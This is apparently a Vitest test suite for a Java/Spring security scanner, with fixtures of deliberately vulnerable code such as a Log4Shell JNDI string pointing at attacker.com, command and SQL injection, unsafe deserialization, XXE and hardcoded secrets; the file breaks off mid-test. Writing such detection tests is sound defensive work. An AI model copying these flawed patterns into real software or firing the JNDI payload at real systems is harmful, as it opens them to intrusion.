import { describe, it, expect } from "vitest";
import { JavaScanAgent } from "./java-agent.js";

function makeFiles(entries: Record<string, string>): Map<string, string> {
  return new Map(Object.entries(entries));
}

const agent = new JavaScanAgent();

// ─── Fixtures ────────────────────────────────────────────────────────────────

const POM_XML = `<?xml version="1.0" encoding="UTF-8"?>
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>myapp</artifactId>
  <version>1.0.0</version>
</project>`;

// Check 1 — Actuator
const ACTUATOR_WILDCARD_PROPS = `
spring.application.name=myapp
management.endpoints.web.exposure.include=*
server.port=8080
`;

const ACTUATOR_SENSITIVE_PROPS = `
management.endpoints.web.exposure.include=env,configprops,heapdump
`;

const ACTUATOR_SAFE_PROPS = `
management.endpoints.web.exposure.include=health,info
`;

const ACTUATOR_WILDCARD_YML = `
management:
  endpoints:
    web:
      exposure:
        include: "*"
`;

// Check 2 — Log4Shell
const LOG4SHELL_CODE = `
package com.example;

import org.apache.logging.log4j.Logger;

public class UserController {
    private static final Logger log = LogManager.getLogger();

    public void handleRequest(String userInput) {
        log.info("User requested: \${jndi:ldap://attacker.com/exploit}");
    }
}
`;

const LOG4SHELL_SAFE = `
package com.example;

public class UserController {
    public void handleRequest(String userInput) {
        logger.info("User requested: " + userInput);
    }
}
`;

// Check 3 — Unsafe deserialization
const DESERIALIZATION_CODE = `
package com.example;

import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;

public class DataProcessor {
    public Object deserialize(byte[] data) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        return ois.readObject();
    }
}
`;

const DESERIALIZATION_SAFE = `
package com.example;

import com.fasterxml.jackson.databind.ObjectMapper;

public class DataProcessor {
    private ObjectMapper mapper = new ObjectMapper();

    public MyDto deserialize(String json) throws Exception {
        return mapper.readValue(json, MyDto.class);
    }
}
`;

// Check 4 — SQL injection via @Query
const QUERY_INJECTION_CODE = `
package com.example;

import org.springframework.data.jpa.repository.Query;

public interface UserRepository extends JpaRepository<User, Long> {
    @Query("SELECT u FROM User u WHERE u.name = '" + name + "'")
    List<User> findByName(String name);
}
`;

const QUERY_SAFE_CODE = `
package com.example;

import org.springframework.data.jpa.repository.Query;

public interface UserRepository extends JpaRepository<User, Long> {
    @Query("SELECT u FROM User u WHERE u.name = :name")
    List<User> findByName(@Param("name") String name);
}
`;

// Check 5 — Credentials in config
const CREDENTIALS_PROPS = `
spring.datasource.url=jdbc:postgresql://localhost:5432/mydb
spring.datasource.username=admin
spring.datasource.password=supersecretpassword123
`;

const CREDENTIALS_YML = `
spring:
  datasource:
    password: myhardcodedpassword
`;

const CREDENTIALS_ENV_REF_PROPS = `
spring.datasource.password=\${DB_PASSWORD}
`;

const CREDENTIALS_PLACEHOLDER_PROPS = `
spring.datasource.password=change-me
`;

// Check 6 — CSRF disabled
const CSRF_DISABLED_V1 = `
package com.example;

@Configuration
@EnableWebSecurity
public class SecurityConfig {
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf().disable()
            .authorizeRequests().anyRequest().authenticated();
    }
}
`;

const CSRF_DISABLED_LAMBDA = `
http.csrf(csrf -> csrf.disable()).authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
`;

const CSRF_DISABLED_ABSTRACT = `
http.csrf(AbstractHttpConfigurer::disable);
`;

const CSRF_ENABLED = `
package com.example;

@Configuration
@EnableWebSecurity
public class SecurityConfig {
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests().anyRequest().authenticated();
    }
}
`;

// Check 7 — XXE
const XXE_CODE = `
package com.example;

import javax.xml.parsers.DocumentBuilderFactory;

public class XmlParser {
    public Document parse(InputStream input) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(input);
    }
}
`;

const XXE_SAFE_CODE = `
package com.example;

import javax.xml.parsers.DocumentBuilderFactory;

public class XmlParser {
    public Document parse(InputStream input) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(input);
    }
}
`;

// Check 8 — @RequestMapping without method
const REQUEST_MAPPING_NO_METHOD = `
package com.example;

@RestController
public class UserController {
    @RequestMapping("/users")
    public List<User> getUsers() {
        return userService.findAll();
    }

    @RequestMapping(value = "/admin/config")
    public Config getConfig() {
        return config;
    }
}
`;

const REQUEST_MAPPING_WITH_METHOD = `
package com.example;

@RestController
public class UserController {
    @GetMapping("/users")
    public List<User> getUsers() {
        return userService.findAll();
    }

    @RequestMapping(value = "/admin", method = RequestMethod.GET)
    public String admin() {
        return "admin";
    }
}
`;

// Check 9 — permitAll on sensitive routes
const PERMIT_ALL_SENSITIVE = `
http
    .authorizeHttpRequests(auth -> auth
        .requestMatchers("/admin/**").permitAll()
        .requestMatchers("/api/users").permitAll()
        .anyRequest().authenticated()
    );
`;

const PERMIT_ALL_PUBLIC = `
http
    .authorizeHttpRequests(auth -> auth
        .requestMatchers("/public/**").permitAll()
        .requestMatchers("/health").permitAll()
        .anyRequest().authenticated()
    );
`;

// Check 10 — Weak hash
const WEAK_HASH_MD5 = `
import java.security.MessageDigest;

public class HashUtil {
    public byte[] hashPassword(String password) throws Exception {
        MessageDigest md = MessageDigest.getInstance("MD5");
        return md.digest(password.getBytes());
    }
}
`;

const WEAK_HASH_SHA1 = `
import java.security.MessageDigest;

public class HashUtil {
    public byte[] hashContent(String content) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-1");
        return md.digest(content.getBytes());
    }
}
`;

const STRONG_HASH = `
import java.security.MessageDigest;

public class HashUtil {
    public byte[] hashContent(String content) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        return md.digest(content.getBytes());
    }
}
`;

// Check 11 — Command injection
const COMMAND_INJECTION_CODE = `
package com.example;

public class FileProcessor {
    public String processFile(String filename) throws Exception {
        Process p = Runtime.getRuntime().exec("convert " + filename + " output.png");
        return readOutput(p);
    }
}
`;

const COMMAND_SAFE_CODE = `
package com.example;

public class FileProcessor {
    public String runFixedCommand() throws Exception {
        Process p = Runtime.getRuntime().exec("ls -la");
        return readOutput(p);
    }
}
`;

// exec() with a String array — separate args passed to OS, no shell involved, SAFE
const COMMAND_ARRAY_EXEC_CODE = `
package com.example;

public class FileProcessor {
    public String processFileSafe(String filename) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"convert", filename, "output.png"});
        return readOutput(p);
    }
}
`;

// ProcessBuilder with string concatenation — dangerous (single string to shell)
const COMMAND_PROCESS_BUILDER_CONCAT = `
package com.example;

public class FileProcessor {
    public String runDynamic(String cmd) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", "echo " + cmd);
        return readOutput(pb.start());
    }
}
`;

// Check 12 — CORS wildcard
const CORS_WILDCARD_ANNOTATION = `
@CrossOrigin(origins = "*")
@RestController
public class ApiController {
    @GetMapping("/data")
    public List<Data> getData() {
        return dataService.findAll();
    }
}
`;

const CORS_BARE_ANNOTATION = `
@CrossOrigin
@RestController
public class ApiController {
    @GetMapping("/data")
    public List<Data> getData() {
        return dataService.findAll();
    }
}
`;

const CORS_ALLOWED_ORIGINS_WILDCARD = `
corsConfiguration.allowedOrigins("*");
`;

const CORS_RESTRICTED = `
@CrossOrigin(origins = "https://myapp.com")
@RestController
public class ApiController {
    @GetMapping("/data")
    public List<Data> getData() {
        return dataService.findAll();
    }
}
`;

// Check 13 — Hardcoded JWT secret
const JWT_HARDCODED_SECRET = `
package com.example;

public class JwtTokenProvider {
    private String jwtSecret = "mySecretKey12345678";

    public String generateToken(String username) {
        return Jwts.builder()
            .setSubject(username)
            .signWith(SignatureAlgorithm.HS512, jwtSecret)
            .compact();
    }
}
`;

const JWT_SIGNING_KEY = `
package com.example;

public class JwtConfig {
    private static final String signing = "hardcodedSigningKeyValue"; // jwt token
}
`;

const JWT_ENV_SECRET = `
package com.example;

public class JwtTokenProvider {
    @Value("\${jwt.secret}")
    private String jwtSecret;

    public String generateToken(String username) {
        return Jwts.builder()
            .setSubject(username)
            .signWith(SignatureAlgorithm.HS512, jwtSecret)
            .compact();
    }
}
`;

// Check 4 — SQL injection with positional params (safe)
const QUERY_POSITIONAL_PARAMS_CODE = `
package com.example;

import org.springframework.data.jpa.repository.Query;

public interface UserRepository extends JpaRepository<User, Long> {
    @Query("SELECT u FROM User u WHERE u.id = ?1 AND u.status = ?2")
    List<User> findByIdAndStatus(Long id, String status);
}
`;

// Check 8 — @RequestMapping suppressed by class-level @Secured
const REQUEST_MAPPING_SECURED_CLASS = `
package com.example;

@RestController
@Secured("ROLE_ADMIN")
public class AdminController {
    @RequestMapping("/admin/dashboard")
    public String dashboard() {
        return "dashboard";
    }
}
`;

const REQUEST_MAPPING_PRE_AUTHORIZE_CLASS = `
package com.example;

@RestController
@PreAuthorize("hasRole('ADMIN')")
public class AdminController {
    @RequestMapping("/admin/reports")
    public List<Report> getReports() {
        return reportService.findAll();
    }
}
`;

// Check 7 — XXE with setFeature on line 10 (tests extended 10-line window)
const XXE_SETFEATURE_FAR_CODE = `
package com.example;

import javax.xml.parsers.DocumentBuilderFactory;

public class XmlParser {
    public Document parse(InputStream input) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // Long block of unrelated setup before securing the factory
        factory.setNamespaceAware(true);
        factory.setValidating(false);
        factory.setCoalescing(true);
        factory.setExpandEntityReferences(false);
        factory.setIgnoringComments(true);
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(input);
    }
}
`;

// Check 14 — printStackTrace() in a catch block that only logs (no client leak)
const STACK_TRACE_LOG_ONLY = `
package com.example;

public class BackgroundWorker {
    private static final Logger log = LoggerFactory.getLogger(BackgroundWorker.class);

    public void processJob(Job job) {
        try {
            job.execute();
        } catch (Exception e) {
            e.printStackTrace();
            log.error("Job failed: {}", job.getId());
        }
    }
}
`;

// Spring Security global config for project-level detection tests
const SPRING_SECURITY_GLOBAL_CONFIG = `
package com.example;

@Configuration
@EnableWebSecurity
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class GlobalSecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests().anyRequest().authenticated();
    }
}
`;

// Check 14 — Stack trace in response
const STACK_TRACE_CODE = `
package com.example;

@RestController
public class UserController {
    @GetMapping("/users/{id}")
    public User getUser(@PathVariable Long id) {
        try {
            return userService.findById(id);
        } catch (Exception e) {
            e.printStackTrace();
            throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
}
`;

const STACK_TRACE_TEST_FILE = `
package com.example;

public class UserServiceTest {
    @Test
    void testGetUser() {
        try {
            service.getUser(1L);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
`;

const STACK_TRACE_LOGGED = `
package com.example;

@RestController
public class UserController {
    private static final Logger log = LoggerFactory.getLogger(UserController.class);

    @GetMapping("/users/{id}")
    public User getUser(@PathVariable Long id) {
        try {
            return userService.findById(id);
        } catch (Exception e) {
            log.error("Failed to get user", e);
            throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR, "Internal error");
        }
    }
}
`;

// Check 15 — Spring Security debug
const SECURITY_DEBUG_TRUE = `
package com.example;

@Configuration
@EnableWebSecurity(debug = true)
public class SecurityConfig {
    // security configuration
}
`;

const SECURITY_DEBUG_FALSE = `
package com.example;

@Configuration
@EnableWebSecurity(debug = false)
public class SecurityConfig {
    // security configuration
}
`;

const SECURITY_NO_DEBUG = `
package com.example;

@Configuration
@EnableWebSecurity
public class SecurityConfig {
    // security configuration
}
`;

// ─── Tests ───────────────────────────────────────────────────────────────────

describe("JavaScanAgent", () => {
  describe("getMetadata()", () => {
    it("returns correct metadata", () => {
      const meta = agent.getMetadata();
      expect(meta.name).toBe("java-agent");
      expect(meta.version).toBe("1.0.0");
      expect(meta.technologies).toEqual(["java", "spring", "kotlin"]);
    });
  });

  // ── detect() ──────────────────────────────────────────────────────────────

  describe("detect()", () => {
    it("detects pom.xml at root", async () => {
      const files = makeFiles({ "pom.xml": POM_XML });
      expect(await agent.detect(files)).toBe(true);
    });

    it("detects build.gradle at root", async () => {
      const files = makeFiles({ "build.gradle": "plugins { id 'java' }" });
      expect(await agent.detect(files)).toBe(true);
    });

    it("detects build.gradle.kts at root", async () => {
      const files = makeFiles({ "build.gradle.kts": 'plugins { kotlin("jvm") }' });
      expect(await agent.detect(files)).toBe(true);
    });

    it("detects pom.xml in a subdirectory", async () => {
      const files = makeFiles({ "backend/pom.xml": POM_XML });
      expect(await agent.detect(files)).toBe(true);
    });

    it("detects build.gradle in a subdirectory", async () => {
      const files = makeFiles({ "services/api/build.gradle": "plugins { id 'java' }" });
      expect(await agent.detect(files)).toBe(true);
    });

    it("returns false for a Node.js project", async () => {
      const files = makeFiles({
        "package.json": '{"dependencies": {"express": "4.18.0"}}',
        "src/index.ts": "console.log('hello')",
      });
      expect(await agent.detect(files)).toBe(false);
    });

    it("returns false for a Python project", async () => {
      const files = makeFiles({
        "requirements.txt": "django==4.2.0",
        "manage.py": "import django",
      });
      expect(await agent.detect(files)).toBe(false);
    });

    it("returns false for an empty file map", async () => {
      expect(await agent.detect(new Map())).toBe(false);
    });
  });

  // ── Check 1: Spring Actuator ───────────────────────────────────────────────

  describe("scan() — Check 1: Spring Actuator exposed", () => {
    it("detects wildcard exposure in .properties", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.properties": ACTUATOR_WILDCARD_PROPS,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Spring Actuator endpoints exposed");
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("HIGH");
      expect(finding!.cwe).toBe("CWE-200");
    });

    it("detects sensitive endpoint names (env, configprops, heapdump)", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.properties": ACTUATOR_SENSITIVE_PROPS,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Spring Actuator endpoints exposed");
      expect(finding).toBeDefined();
    });

    it("detects wildcard in .yml", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.yml": ACTUATOR_WILDCARD_YML,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Spring Actuator endpoints exposed");
      expect(finding).toBeDefined();
    });

    it("does not flag safe health,info exposure", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.properties": ACTUATOR_SAFE_PROPS,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Spring Actuator endpoints exposed");
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 2: Log4Shell ─────────────────────────────────────────────────────

  describe("scan() — Check 2: Log4Shell", () => {
    it("detects ${jndi: string in Java source", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserController.java": LOG4SHELL_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Log4Shell JNDI lookup string detected");
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("CRITICAL");
      expect(finding!.cwe).toBe("CWE-917");
    });

    it("does not flag safe logging without JNDI", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserController.java": LOG4SHELL_SAFE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Log4Shell JNDI lookup string detected");
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 3: Unsafe deserialization ───────────────────────────────────────

  describe("scan() — Check 3: Unsafe deserialization", () => {
    it("detects new ObjectInputStream(", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/DataProcessor.java": DESERIALIZATION_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Unsafe Java deserialization via ObjectInputStream",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("CRITICAL");
      expect(finding!.cwe).toBe("CWE-502");
    });

    it("does not flag Jackson ObjectMapper", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/DataProcessor.java": DESERIALIZATION_SAFE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Unsafe Java deserialization via ObjectInputStream",
      );
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 4: SQL injection via @Query ──────────────────────────────────────

  describe("scan() — Check 4: SQL injection via @Query", () => {
    it("detects @Query with string concatenation", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserRepository.java": QUERY_INJECTION_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "SQL injection via @Query with string concatenation",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("CRITICAL");
      expect(finding!.cwe).toBe("CWE-89");
    });

    it("does not flag @Query with named parameters", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserRepository.java": QUERY_SAFE_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "SQL injection via @Query with string concatenation",
      );
      expect(finding).toBeUndefined();
    });

    it("does not flag @Query with positional parameters (?1, ?2)", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserRepository.java": QUERY_POSITIONAL_PARAMS_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "SQL injection via @Query with string concatenation",
      );
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 5: Credentials in config ────────────────────────────────────────

  describe("scan() — Check 5: Credentials in config", () => {
    it("detects hardcoded password in .properties", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.properties": CREDENTIALS_PROPS,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Hardcoded credential in configuration file",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("CRITICAL");
      expect(finding!.cwe).toBe("CWE-798");
    });

    it("detects hardcoded password in .yml", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.yml": CREDENTIALS_YML,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Hardcoded credential in configuration file",
      );
      expect(finding).toBeDefined();
    });

    it("does not flag environment variable reference ${DB_PASSWORD}", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.properties": CREDENTIALS_ENV_REF_PROPS,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Hardcoded credential in configuration file",
      );
      expect(finding).toBeUndefined();
    });

    it("does not flag placeholder values like change-me", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/resources/application.properties": CREDENTIALS_PLACEHOLDER_PROPS,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Hardcoded credential in configuration file",
      );
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 6: CSRF disabled ─────────────────────────────────────────────────

  describe("scan() — Check 6: CSRF disabled", () => {
    it("detects .csrf().disable()", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": CSRF_DISABLED_V1,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "CSRF protection disabled");
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("HIGH");
      expect(finding!.cwe).toBe("CWE-352");
    });

    it("detects csrf(csrf -> csrf.disable()) lambda form", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": CSRF_DISABLED_LAMBDA,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "CSRF protection disabled");
      expect(finding).toBeDefined();
    });

    it("detects .csrf(AbstractHttpConfigurer::disable)", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": CSRF_DISABLED_ABSTRACT,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "CSRF protection disabled");
      expect(finding).toBeDefined();
    });

    it("does not flag config without CSRF disable call", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": CSRF_ENABLED,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "CSRF protection disabled");
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 7: XXE ──────────────────────────────────────────────────────────

  describe("scan() — Check 7: XXE vulnerability", () => {
    it("detects DocumentBuilderFactory without setFeature", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/XmlParser.java": XXE_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "XML External Entity (XXE) vulnerability");
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("HIGH");
      expect(finding!.cwe).toBe("CWE-611");
    });

    it("does not flag DocumentBuilderFactory with setFeature nearby", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/XmlParser.java": XXE_SAFE_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "XML External Entity (XXE) vulnerability");
      expect(finding).toBeUndefined();
    });

    it("does not flag DocumentBuilderFactory when setFeature appears within 10 lines", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/XmlParser.java": XXE_SETFEATURE_FAR_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "XML External Entity (XXE) vulnerability");
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 8: @RequestMapping without method ────────────────────────────────

  describe("scan() — Check 8: @RequestMapping without method", () => {
    it("detects @RequestMapping with path string but no method=", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserController.java": REQUEST_MAPPING_NO_METHOD,
      });
      const results = await agent.scan(files);
      const findings = results.filter((r) =>
        r.title === "@RequestMapping without HTTP method restriction",
      );
      expect(findings.length).toBeGreaterThanOrEqual(1);
      expect(findings[0]!.severity).toBe("MEDIUM");
      expect(findings[0]!.cwe).toBe("CWE-749");
    });

    it("does not flag @GetMapping or @RequestMapping with method=", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/UserController.java": REQUEST_MAPPING_WITH_METHOD,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "@RequestMapping without HTTP method restriction",
      );
      expect(finding).toBeUndefined();
    });

    it("does not flag @RequestMapping when class has @RestController + @Secured", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/AdminController.java": REQUEST_MAPPING_SECURED_CLASS,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "@RequestMapping without HTTP method restriction",
      );
      expect(finding).toBeUndefined();
    });

    it("does not flag @RequestMapping when class has @RestController + @PreAuthorize", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/AdminController.java": REQUEST_MAPPING_PRE_AUTHORIZE_CLASS,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "@RequestMapping without HTTP method restriction",
      );
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 9: permitAll on sensitive routes ────────────────────────────────

  describe("scan() — Check 9: permitAll on sensitive routes", () => {
    it("detects permitAll on /admin path", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": PERMIT_ALL_SENSITIVE,
      });
      const results = await agent.scan(files);
      const findings = results.filter((r) =>
        r.title === "Sensitive route accessible without authentication",
      );
      expect(findings.length).toBeGreaterThanOrEqual(1);
      expect(findings[0]!.severity).toBe("HIGH");
      expect(findings[0]!.cwe).toBe("CWE-306");
    });

    it("does not flag permitAll on /public or /health", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/SecurityConfig.java": PERMIT_ALL_PUBLIC,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Sensitive route accessible without authentication",
      );
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 10: Weak hash algorithm ─────────────────────────────────────────

  describe("scan() — Check 10: Weak hash algorithm", () => {
    it("detects MessageDigest.getInstance(\"MD5\")", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/HashUtil.java": WEAK_HASH_MD5,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title.startsWith("Weak hash algorithm"));
      expect(finding).toBeDefined();
      expect(finding!.title).toContain("MD5");
      expect(finding!.severity).toBe("HIGH");
      expect(finding!.cwe).toBe("CWE-328");
    });

    it("detects MessageDigest.getInstance(\"SHA-1\")", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/HashUtil.java": WEAK_HASH_SHA1,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title.startsWith("Weak hash algorithm"));
      expect(finding).toBeDefined();
      expect(finding!.title).toContain("SHA-1");
    });

    it("does not flag SHA-256", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/HashUtil.java": STRONG_HASH,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title.startsWith("Weak hash algorithm"));
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 11: Command injection ────────────────────────────────────────────

  describe("scan() — Check 11: Command injection", () => {
    it("detects Runtime.exec() with string concatenation", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/FileProcessor.java": COMMAND_INJECTION_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Command injection via Runtime.exec() with dynamic input",
      );
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("CRITICAL");
      expect(finding!.cwe).toBe("CWE-78");
      expect(finding!.confidence).toBe("high");
    });

    it("does not flag Runtime.exec() with a plain string literal (no +)", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/FileProcessor.java": COMMAND_SAFE_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Command injection via Runtime.exec() with dynamic input",
      );
      expect(finding).toBeUndefined();
    });

    it("does not flag Runtime.exec(new String[]{...}) — array args are safe", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/FileProcessor.java": COMMAND_ARRAY_EXEC_CODE,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Command injection via Runtime.exec() with dynamic input",
      );
      expect(finding).toBeUndefined();
    });

    it("detects ProcessBuilder with string concatenation", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/FileProcessor.java": COMMAND_PROCESS_BUILDER_CONCAT,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) =>
        r.title === "Command injection via Runtime.exec() with dynamic input",
      );
      expect(finding).toBeDefined();
      expect(finding!.confidence).toBe("high");
    });
  });

  // ── Check 12: CORS wildcard ────────────────────────────────────────────────

  describe("scan() — Check 12: CORS wildcard", () => {
    it("detects @CrossOrigin(origins = \"*\")", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/ApiController.java": CORS_WILDCARD_ANNOTATION,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "CORS wildcard allows all origins");
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("MEDIUM");
      expect(finding!.cwe).toBe("CWE-942");
    });

    it("detects bare @CrossOrigin with no arguments", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/ApiController.java": CORS_BARE_ANNOTATION,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "CORS wildcard allows all origins");
      expect(finding).toBeDefined();
    });

    it("detects allowedOrigins(\"*\")", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/CorsConfig.java": CORS_ALLOWED_ORIGINS_WILDCARD,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "CORS wildcard allows all origins");
      expect(finding).toBeDefined();
    });

    it("does not flag @CrossOrigin with a specific origin", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/ApiController.java": CORS_RESTRICTED,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "CORS wildcard allows all origins");
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 13: Hardcoded JWT secret ────────────────────────────────────────

  describe("scan() — Check 13: Hardcoded JWT secret", () => {
    it("detects jwtSecret = \"...\" hardcoded string", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/JwtTokenProvider.java": JWT_HARDCODED_SECRET,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Hardcoded JWT secret in source code");
      expect(finding).toBeDefined();
      expect(finding!.severity).toBe("CRITICAL");
      expect(finding!.cwe).toBe("CWE-798");
    });

    it("detects signing = \"...\" in JWT context", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/JwtConfig.java": JWT_SIGNING_KEY,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Hardcoded JWT secret in source code");
      expect(finding).toBeDefined();
    });

    it("does not flag @Value-injected JWT secret", async () => {
      const files = makeFiles({
        "pom.xml": POM_XML,
        "src/main/java/JwtTokenProvider.java": JWT_ENV_SECRET,
      });
      const results = await agent.scan(files);
      const finding = results.find((r) => r.title === "Hardcoded JWT secret in source code");
      expect(finding).toBeUndefined();
    });
  });

  // ── Check 14: Stack trace in response ─────────────────────────────────────

  describe("scan() — Check 14: Stack trace in response", () => {
    it("detects e.printStackTrace() in production code", async () => {
